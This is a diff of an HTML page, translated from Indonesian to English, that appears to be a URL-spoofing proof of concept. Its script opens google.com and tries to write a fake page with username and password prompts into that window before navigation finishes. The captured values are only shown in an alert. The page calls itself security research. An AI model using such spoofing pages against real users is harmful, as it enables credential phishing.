@@ -1,9 +1,9 @@
 <!doctype html>
-<html lang="id">
+<html lang="en">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Pengetesan Keamanan Browser</title>
+    <title>URL Spoofing Test Lab</title>
     <style>
       body {
         font-family: sans-serif;
@@ -11,15 +11,14 @@
         justify-content: center;
         align-items: center;
         height: 100vh;
-        margin: 0;
         background-color: #f0f0f0;
       }
       .container {
         text-align: center;
-        padding: 2rem;
+        padding: 20px;
         background: white;
         border-radius: 8px;
-        shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
       }
       button {
         padding: 10px 20px;
@@ -37,41 +36,32 @@
   </head>
   <body>
     <div class="container">
-      <h2>Eksperimen Spoofing URL</h2>
-      <p>Klik tombol di bawah untuk menjalankan skrip testing.</p>
-      <button onclick="spoof()">Buka Halaman</button>
+      <h2>Security Research: Spoofing Test</h2>
+      <p>
+        Click the button below to execute the <code>spoof()</code> function.
+      </p>
+      <button onclick="spoof()">Run Spoof Test</button>
     </div>
 
     <script>
       function spoof() {
-        // Membuka jendela baru
+        // Buka page baru pointing ke target (akan menjadi spoofed URL)
         let win = window.open("https://www.google.com/", "_blank");
 
-        // Mencoba menginjeksi konten
+        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
         setTimeout(() => {
           try {
-            if (win && !win.closed) {
-              win.document.write(`
-            <div style="text-align:center; margin-top:50px;">
-                <h1>Peringatan: Ini Halaman Simulasi</h1>
-                <p>Jika teks ini muncul, berarti browser mengizinkan akses ke dokumen lintas domain.</p>
-                <button onclick="
-                  let username = prompt('Masukkan username');
-                  let password = prompt('Masukkan password');
-                  alert('Data diterima:\\nUser: ' + username + '\\nPass: ' + password);
-                ">Tes Input</button>
-            </div>
-          `);
-              win.document.close();
-            }
+            win.document.write(`
+  <h1>This is not Google!</h1>
+<button onclick="
+  let username = prompt('Enter your username');
+  let password = prompt('Enter your password');
+  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+">Click me</button>
+            `);
+            win.document.close();
           } catch (e) {
-            console.warn(
-              "Akses ditolak oleh kebijakan keamanan browser (SOP):",
-              e,
-            );
-            alert(
-              "Gagal: Browser memblokir akses ke dokumen Google karena kebijakan Same-Origin.",
-            );
+            console.warn("Blocked by browser protections:", e);
           }
         }, 50);
       }
